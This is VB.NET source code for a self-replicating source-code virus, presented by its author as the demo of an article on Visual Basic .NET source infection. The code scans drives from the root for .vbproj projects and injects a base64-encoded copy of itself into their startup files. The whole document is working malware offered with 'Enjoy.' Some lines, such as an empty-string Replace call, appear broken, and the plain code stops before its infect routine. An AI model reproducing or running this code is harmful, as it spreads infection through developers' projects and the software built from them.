'VB.NET Source Code Infector
'---------------------------
'
' by alcopaul/brigada ocho
' may 24, 2011
'
' This is the demo code of my article "Visual Basic .NET Source Code Infection"
'
'
' Notes
'
' 1.) Infects Windows Forms and non-Windows Forms/Console .vb files
' 2.) Uses System.Xml namespace and modifies the target .vbproj file to contain System.Xml as a reference
' 3.) Xml parsing fails if a key contains xmlns="http://schemas.microsoft.com/developer/msbuild/2003". It was handled
'     successfully
' 4.) Infects 5 vb files per run
' 5.) Outline -> check .vbproj -> determine if windows form or non-windows form -> get the startup .vb file -> infect
'
'
' Below is the virus. Enjoy.
'
'



Public Class MainForm

    Private Sub MainForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
	Dim hxxxx As New hm.Virus
	Dim gxxxx As New System.Threading.Thread(AddressOf hxxxx.LOL)
	gxxxx.Start()
    End Sub

End Class

Namespace hm
    Public Class Virus
        Private Shared counter As Integer = 0
        Private Shared classname As String = ""
        Private Shared database As String = "TmFtZXNwYWNlIGhtDQogICAgUHVibGljIENsYXNzIFZpcnVzDQogICAgICAgIFByaXZhdGUgU2hhcmVkIGNvdW50ZXIgQXMgSW50ZWdlciA9IDANCiAgICAgICAgUHJpdmF0ZSBTaGFyZWQgY2xhc3NuYW1lIEFzIFN0cmluZyA9ICIiDQogICAgICAgIFByaXZhdGUgU2hhcmVkIGRhdGFiYXNlIEFzIFN0cmluZyA9ICI=>Ig0KICAgICAgICBQdWJsaWMgU3ViIEFuZExldHNSb2NrKEJ5VmFsIEdHRyBBcyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbykNCiAgICAgICAgICAgIERpbSBnZyBBcyBTeXN0ZW0uSU8uRmlsZUluZm8oKSA9IEdHRy5HZXRGaWxlcygiKi52YnByb2oiKQ0KICAgICAgICAgICAgRm9yIEVhY2ggeGcgQXMgU3lzdGVtLklPLkZpbGVJbmZvIEluIGdnDQogICAgICAgICAgICAgICAgRGltIGhnIEFzIFN0cmluZyA9IHhnLkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgRGltIGN1cmRpcnggQXMgU3RyaW5nID0gU3lzdGVtLklPLlBhdGguR2V0RGlyZWN0b3J5TmFtZShoZykNCiAgICAgICAgICAgICAgICBEaW0gZ0xvdyBBcyBTdHJpbmcgPSByZWFkZXJ4KGhnKQ0KICAgICAgICAgICAgICAgIERpbSByZW12YWwgQXMgU3RyaW5nID0gInhtbG5zPSIiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS9kZXZlbG9wZXIvbXNidWlsZC8yMDAzIiIiDQogICAgICAgICAgICAgICAgRGltIGdMb3dOZXcgQXMgU3RyaW5nID0gZ0xvdy5SZXBsYWNlKHJlbXZhbCwgIiIpDQogICAgICAgICAgICAgICAgeG1scmVhZChnTG93TmV3LCAiUHJvamVjdC9Qcm9wZXJ0eUdyb3VwL1N0YXJ0dXBPYmplY3QiKQ0KICAgICAgICAgICAgICAgIElmIGNsYXNzbmFtZS5JbmRleE9mKCJNeS5NeUFwcGxpY2F0aW9uIikgPj0gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgIFRyeQ0KICAgICAgICAgICAgICAgICAgICAgICAgRGltIGdMb3d4IEFzIFN0cmluZyA9IHJlYWRlcngoY3VyZGlyeCAmICJcTXkgUHJvamVjdFxBcHBsaWNhdGlvbi5teWFwcCIpDQogICAgICAgICAgICAgICAgICAgICAgICB4bWxyZWFkKGdMb3d4LCAiTXlBcHBsaWNhdGlvbkRhdGEvTWFpbkZvcm0iKQ0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgY2xhc3NuYW1lID0gIiIgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnRpbnVlIEZvcg0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgICAgICBNaWRDb2RlKGdMb3csIGhnLCBjdXJkaXJ4LCAiY2xhc3MgIiAmIGNsYXNzbmFtZS5Ub0xvd2VyKCksICJfTG9hZCgiLCBUcnVlKQ0KICAgICAgICAgICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnRpbnVlIEZvcg0KICAgICAgICAgICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgICAgICAgICAgRWxzZUlmIChjbGFzc25hbWUuSW5kZXhPZigiU3ViIE1haW4iKSA+PSAwKSBPciAoY2xhc3NuYW1lLkluZGV4T2YoIi4iKSA+PSAwKSBUaGVuDQogICAgICAgICAgICAgICAgICAgIERpbSB4Z2dnIEFzIFN0cmluZyA9ICIiDQogICAgICAgICAgICAgICAgICAgIElmIGNsYXNzbmFtZS5JbmRleE9mKCJTdWIgTWFpbiIpID49IDAgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgeGdnZyA9ICJzdWIgbWFpbigpIg0KICAgICAgICAgICAgICAgICAgICBFbHNlSWYgY2xhc3NuYW1lLkluZGV4T2YoIi4iKSA+PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgIERpbSBzcGxpdCBBcyBTdHJpbmcoKSA9IGNsYXNzbmFtZS5TcGxpdChOZXcgW0NoYXJdKCkgeyIuImN9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgeGdnZyA9ICJtb2R1bGUgIiAmIHNwbGl0KDEpLlRvTG93ZXIoKQ0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgICAgICAgICBNaWRDb2RlKGdMb3csIGhnLCBjdXJkaXJ4LCB4Z2dnLCAiU3ViIE1haW4oKSIsIEZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAgICAgICAgICAgICAgIENvbnRpbnVlIEZvcg0KICAgICAgICAgICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgICAgICBDb250aW51ZSBGb3INCiAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgICAgIERpbSBkaXJzIEFzIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvKCkgPSBHR0cuR2V0RGlyZWN0b3JpZXMoIiouKiIpDQogICAgICAgICAgICBGb3IgRWFjaCBqIEFzIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvIEluIGRpcnMNCiAgICAgICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICAgICAgSWYgY291bnRlciA9IDUgVGhlbg0KICAgICAgICAgICAgICAgICAgICAgICAgUmV0dXJuDQogICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBBbmRMZXRzUm9jayhqKQ0KICAgICAgICAgICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICAgICAgICAgICAgICBDb250aW51ZSBGb3INCiAgICAgICAgICAgICAgICBFbmQgVHJ5DQogICAgICAgICAgICBOZXh0DQogICAgICAgIEVuZCBTdWINCiAgICAgICAgUHVibGljIFN1YiBNaWRDb2RlKEJ5VmFsIGdMb3cgQXMgU3RyaW5nLCBCeVZhbCBoZyBBcyBTdHJpbmcsIEJ5VmFsIGN1cmRpcnggQXMgU3RyaW5nLCBCeVZhbCB4Z2dnIEFzIFN0cmluZywgQnlWYWwgZ2dneCBBcyBTdHJpbmcsIEJ5VmFsIGZvcm1hdCBBcyBCb29sZWFuKQ0KICAgICAgICAgICAgSWYgZ0xvdy5JbmRleE9mKCIiIlN5c3RlbS5YbWwiIiIpID49IDAgVGhlbg0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIERpbSBra2sgQXMgU3RyaW5nID0gZ0xvdy5SZXBsYWNlKCI8UmVmZXJlbmNlIEluY2x1ZGU9IiJTeXN0ZW0uV2luZG93cy5Gb3JtcyIiIC8+IiwgIjxSZWZlcmVuY2UgSW5jbHVkZT0iIlN5c3RlbS5XaW5kb3dzLkZvcm1zIiIgLz4iICYgdmJDckxmICYgdmJUYWIgJiAiPFJlZmVyZW5jZSBJbmNsdWRlPSIiU3lzdGVtLlhtbCIiIC8+IikNCiAgICAgICAgICAgICAgICB3cml0ZXJ4KGhnLCBra2spDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIERpbSBqIEFzIE5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhjdXJkaXJ4ICYgIlwiKQ0KICAgICAgICAgICAgRGltIGcgQXMgU3lzdGVtLklPLkZpbGVJbmZvKCkgPSBqLkdldEZpbGVzKCIqLnZiIikNCiAgICAgICAgICAgIEZvciBFYWNoIHggQXMgU3lzdGVtLklPLkZpbGVJbmZvIEluIGcNCiAgICAgICAgICAgICAgICBEaW0gaCBBcyBTdHJpbmcgPSB4LkZ1bGxOYW1lDQogICAgICAgICAgICAgICAgVHJ5DQogICAgICAgICAgICAgICAgICAgIERpbSBnTG93eHggQXMgU3RyaW5nID0gcmVhZGVyeChoKQ0KICAgICAgICAgICAgICAgICAgICBJZiBnTG93eHguVG9Mb3dlcigpLkluZGV4T2YoeGdnZykgPj0gMCBUaGVuDQogICAgICAgICAgICAgICAgICAgICAgICBJZiBnTG93eHguSW5kZXhPZihnZ2d4KSA+PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBJZiBnTG93eHguSW5kZXhPZigiYWxjb3BhdWwiKSA+PSAwIFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGluZmVjdChoLCBnTG93eHgsIGZvcm1hdCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY291bnRlciA9IGNvdW50ZXIgKyAxDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIElmIGNvdW50ZXIgPSA1IFRoZW4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJldHVybg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICAgICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgICAgICBDYXRjaCBleCBBcyBFeGNlcHRpb24NCiAgICAgICAgICAgICAgICAgICAgQ29udGludWUgRm9yDQogICAgICAgICAgICAgICAgRW5kIFRyeQ0KICAgICAgICAgICAgTmV4dA0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBTdWIgTE9MKCkNCiAgICAgICAgICAgIERpbSB4eCBBcyBTdHJpbmcgPSBTeXN0ZW0uSU8uUGF0aC5HZXREaXJlY3RvcnlOYW1lKFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzLkdldEN1cnJlbnRQcm9jZXNzKCkuTWFpbk1vZHVsZS5GaWxlTmFtZSkNCiAgICAgICAgICAgIERpbSBkaXJ4IEFzIE5ldyBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyhTeXN0ZW0uSU8uRGlyZWN0b3J5LkdldERpcmVjdG9yeVJvb3QoeHgpKQ0KICAgICAgICAgICAgQW5kTGV0c1JvY2soZGlyeCkNCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgRnVuY3Rpb24gZGVjb2RlYjY0KEJ5VmFsIGQgQXMgU3RyaW5nKSBBcyBTdHJpbmcNCiAgICAgICAgICAgIFJldHVybiBTeXN0ZW0uVGV4dC5FbmNvZGluZy5VVEY4LkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGQpKQ0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICAgICAgUHVibGljIFN1YiB4bWxyZWFkKEJ5VmFsIHhtbCBBcyBTdHJpbmcsIEJ5VmFsIG5vZGVzdHIgQXMgU3RyaW5nKQ0KICAgICAgICAgICAgRGltIGRvYyBBcyBOZXcgU3lzdGVtLlhtbC5YbWxEb2N1bWVudA0KICAgICAgICAgICAgZG9jLkxvYWRYbWwoeG1sKQ0KICAgICAgICAgICAgRGltIG5vZGVzIEFzIFN5c3RlbS5YbWwuWG1sTm9kZUxpc3QgPSBkb2MuU2VsZWN0Tm9kZXMobm9kZXN0cikNCiAgICAgICAgICAgIEZvciBFYWNoIGQgQXMgU3lzdGVtLlhtbC5YbWxOb2RlIEluIG5vZGVzDQogICAgICAgICAgICAgICAgY2xhc3NuYW1lID0gZC5Jbm5lclRleHQNCiAgICAgICAgICAgIE5leHQNCiAgICAgICAgRW5kIFN1Yg0KICAgICAgICBQdWJsaWMgRnVuY3Rpb24gcmVhZGVyeChCeVZhbCBwYXRoIEFzIFN0cmluZykgQXMgU3RyaW5nDQogICAgICAgICAgICBEaW0gcmVhZGVyIEFzIE5ldyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKHBhdGgsIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVuaWNvZGUpDQogICAgICAgICAgICBEaW0gZ0xvdyBBcyBTdHJpbmcgPSByZWFkZXIuUmVhZFRvRW5kKCkNCiAgICAgICAgICAgIHJlYWRlci5DbG9zZSgpDQogICAgICAgICAgICBSZXR1cm4gZ0xvdw0KICAgICAgICBFbmQgRnVuY3Rpb24NCiAgICAgICAgUHVibGljIFN1YiB3cml0ZXJ4KEJ5VmFsIHBhdGggQXMgU3RyaW5nLCBCeVZhbCBkYXRheCBBcyBTdHJpbmcpDQogICAgICAgICAgICBEaW0gZ3ggQXMgTmV3IFN5c3RlbS5JTy5TdHJlYW1Xcml0ZXIocGF0aCkNCiAgICAgICAgICAgIGd4LldyaXRlKGRhdGF4KQ0KICAgICAgICAgICAgZ3guRmx1c2goKQ0KICAgICAgICAgICAgZ3guQ2xvc2UoKQ0KICAgICAgICBFbmQgU3ViDQogICAgICAgIFB1YmxpYyBTdWIgaW5mZWN0KEJ5VmFsIGcgQXMgU3RyaW5nLCBCeVZhbCBnZ2cgQXMgU3RyaW5nLCBCeVZhbCBmb3JtYXR4IEFzIEJvb2xlYW4pDQogICAgICAgICAgICBEaW0gZ2dneCBBcyBTdHJpbmcgPSAiIg0KICAgICAgICAgICAgSWYgZm9ybWF0eCA9IFRydWUgVGhlbg0KICAgICAgICAgICAgICAgIERpbSBnZ2dnIEFzIFN0cmluZyA9IGdnZy5TdWJzdHJpbmcoZ2dnLkluZGV4T2YoIl9Mb2FkKCIpICsgTGVuKCJfTG9hZCgiKSwgZ2dnLkluZGV4T2YoIi5Mb2FkIikgLSAoZ2dnLkluZGV4T2YoIl9Mb2FkKCIpICsgTGVuKCJfTG9hZCgiKSkpDQogICAgICAgICAgICAgICAgZ2dnID0gZ2dnLlJlcGxhY2UoZ2dnZywgIiIpDQogICAgICAgICAgICAgICAgZ2dneCA9IGdnZy5SZXBsYWNlKCJfTG9hZCguTG9hZCIsICJfTG9hZChCeVZhbCBzZW5kZXIgQXMgU3lzdGVtLk9iamVjdCwgQnlWYWwgZSBBcyBTeXN0ZW0uRXZlbnRBcmdzKSBIYW5kbGVzIE15QmFzZS5Mb2FkIiAmIHZiQ3JMZiAmIHZiVGFiICYgIkRpbSBoeHh4eCBBcyBOZXcgaG0uVmlydXMiICYgdmJDckxmICYgdmJUYWIgJiAiRGltIGd4eHh4IEFzIE5ldyBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZChBZGRyZXNzT2YgaHh4eHguTE9MKSIgJiB2YkNyTGYgJiB2YlRhYiAmICJneHh4eC5TdGFydCgpIiAmIHZiQ3JMZikNCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICBnZ2d4ID0gZ2dnLlJlcGxhY2UoIlN1YiBNYWluKCkiLCAiU3ViIE1haW4oKSIgJiB2YkNyTGYgJiB2YlRhYiAmICJEaW0gaHh4eHggQXMgTmV3IGhtLlZpcnVzIiAmIHZiQ3JMZiAmIHZiVGFiICYgIkRpbSBneHh4eCBBcyBOZXcgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQoQWRkcmVzc09mIGh4eHh4LkxPTCkiICYgdmJDckxmICYgdmJUYWIgJiAiZ3h4eHguU3RhcnQoKSIgJiB2YkNyTGYpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgICAgIERpbSBzcGxpdCBBcyBTdHJpbmcoKSA9IGRhdGFiYXNlLlNwbGl0KE5ldyBbQ2hhcl0oKSB7Ij4iY30pDQogICAgICAgICAgICB3cml0ZXJ4KGcsIGdnZ3ggJiB2YkNyTGYgJiBkZWNvZGViNjQoc3BsaXQoMCkpICYgZGF0YWJhc2UgJiBkZWNvZGViNjQoc3BsaXQoMSkpICYgdmJDckxmKQ0KICAgICAgICBFbmQgU3ViDQogICAgRW5kIENsYXNzDQpFbmQgTmFtZXNwYWNl"
        Public Sub AndLetsRock(ByVal GGG As System.IO.DirectoryInfo)
            Dim gg As System.IO.FileInfo() = GGG.GetFiles("*.vbproj")
            For Each xg As System.IO.FileInfo In gg
                Dim hg As String = xg.FullName
                Dim curdirx As String = System.IO.Path.GetDirectoryName(hg)
                Dim gLow As String = readerx(hg)
                Dim remval As String = "xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"""
                Dim gLowNew As String = gLow.Replace(remval, "")
                xmlread(gLowNew, "Project/PropertyGroup/StartupObject")
                If classname.IndexOf("My.MyApplication") >= 0 Then
                    Try
                        Dim gLowx As String = readerx(curdirx & "\My Project\Application.myapp")
                        xmlread(gLowx, "MyApplicationData/MainForm")
                        If classname = "" Then
                            Continue For
                        End If
                        MidCode(gLow, hg, curdirx, "class " & classname.ToLower(), "_Load(", True)
                    Catch ex As Exception
                        Continue For
                    End Try
                ElseIf (classname.IndexOf("Sub Main") >= 0) Or (classname.IndexOf(".") >= 0) Then
                    Dim xggg As String = ""
                    If classname.IndexOf("Sub Main") >= 0 Then
                        xggg = "sub main()"
                    ElseIf classname.IndexOf(".") >= 0 Then
                        Dim split As String() = classname.Split(New [Char]() {"."c})
                        xggg = "module " & split(1).ToLower()
                    End If
                    Try
                        MidCode(gLow, hg, curdirx, xggg, "Sub Main()", False)
                    Catch ex As Exception
                        Continue For
                    End Try
                Else
                    Continue For
                End If
            Next
            Dim dirs As System.IO.DirectoryInfo() = GGG.GetDirectories("*.*")
            For Each j As System.IO.DirectoryInfo In dirs
                Try
                    If counter = 5 Then
                        Return
                    End If
                    AndLetsRock(j)
                Catch ex As Exception
                    Continue For
                End Try
            Next
        End Sub
        Public Sub MidCode(ByVal gLow As String, ByVal hg As String, ByVal curdirx As String, ByVal xggg As String, ByVal gggx As String, ByVal format As Boolean)
            If gLow.IndexOf("""System.Xml""") >= 0 Then
            Else
                Dim kkk As String = gLow.Replace("", "" & vbCrLf & vbTab & "")
                writerx(hg, kkk)
            End If
            Dim j As New System.IO.DirectoryInfo(curdirx & "\")
            Dim g As System.IO.FileInfo() = j.GetFiles("*.vb")
            For Each x As System.IO.FileInfo In g
                Dim h As String = x.FullName
                Try
                    Dim gLowxx As String = readerx(h)
                    If gLowxx.ToLower().IndexOf(xggg) >= 0 Then
                        If gLowxx.IndexOf(gggx) >= 0 Then
                            If gLowxx.IndexOf("alcopaul") >= 0 Then
                            Else
                                infect(h, gLowxx, format)
                                counter = counter + 1
                                If counter = 5 Then
                                    Return
                                End If
                            End If
                        End If
                    End If
                Catch ex As Exception
                    Continue For
                End Try
            Next
        End Sub
        Public Sub LOL()
            Dim xx As String = System.IO.Path.GetDirectoryName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName)
            Dim dirx As New System.IO.DirectoryInfo(System.IO.Directory.GetDirectoryRoot(xx))
            AndLetsRock(dirx)
        End Sub
        Public Function decodeb64(ByVal d As String) As String
            Return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(d))
        End Function
        Public Sub xmlread(ByVal xml As String, ByVal nodestr As String)
            Dim doc As New System.Xml.XmlDocument
            doc.LoadXml(xml)
            Dim nodes As System.Xml.XmlNodeList = doc.SelectNodes(nodestr)
            For Each d As System.Xml.XmlNode In nodes
                classname = d.InnerText
            Next
        End Sub
        Public Function readerx(ByVal path As String) As String
            Dim reader As New System.IO.StreamReader(path, System.Text.Encoding.Unicode)
            Dim gLow As String = reader.ReadToEnd()
            reader.Close()
            Return gLow
        End Function
